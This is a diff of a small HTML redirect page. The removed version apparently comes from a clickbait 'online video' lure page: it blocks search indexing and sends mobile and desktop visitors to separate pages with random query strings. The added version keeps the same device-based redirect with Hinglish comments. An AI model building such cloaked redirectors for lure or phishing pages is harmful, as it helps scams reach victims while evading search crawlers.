@@ -1,36 +1,40 @@
-</script>
+<!DOCTYPE html>
+<html>
 <head>
-                <meta charset="utf-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-                <meta name="description" content="live">
-                <meta name="keywords" content="">
-                <meta name="generator" content="WordPress 5.3.2">
-                <title>🔥online vide🔥</title>
-            
-                <link rel="canonical" href="./alcashfbmeta.html">
-                <meta name="theme-color" content="#563d7c">
-<meta property="og:url"                content="./alcashfbmeta.html"/>
-                
-                
-        
-        </body>
-        
-<META name="robots" content="NOINDEX,NOFOLLOW,NOARCHIVE,NOODP,NOSNIPPET">
-<script type="text/javascript">
-//<![CDATA[
- function h(r, a) { var t = ""; if ("mix" == a) var h = 
-"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; else var h = 
-"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; for (var n = 0; r > n; n++) t += h.charAt(Math.floor(Math.random() * 
-h.length)); return t };
+    <meta charset="utf-8">
+    <title>Loading...</title>
+    
+    <script type="text/javascript">
+        // Random string banane ka function (Security ya Tracking ke liye)
+        function generateRandomID(length) {
+            var result = '';
+            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            for (var i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return result;
+        }
 
-        var device = navigator.userAgent
-        
-        if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))
-        {
-         window.location = "./mobile.html?"+ h(7, '')+"";
-        }else
-{
-window.location = "./pc.html?"+ h(7, '')+"";
-}
-//]]>
-</script>
+        // Device check karne ka function
+        function redirectUser() {
+            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            var randomStr = generateRandomID(8); // 8 characters ka random code
+
+            // Mobile check (Android, iPhone, iPad, etc.)
+            if (/android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase())) {
+                window.location.href = "./mobile.html?id=" + randomStr;
+            } 
+            // Agar PC/Desktop ho
+            else {
+                window.location.href = "./pc.html?id=" + randomStr;
+            }
+        }
+
+        // Script ko foran chalana
+        window.onload = redirectUser;
+    </script>
+</head>
+<body>
+    <p>Please wait, redirecting...</p>
+</body>
+</html>
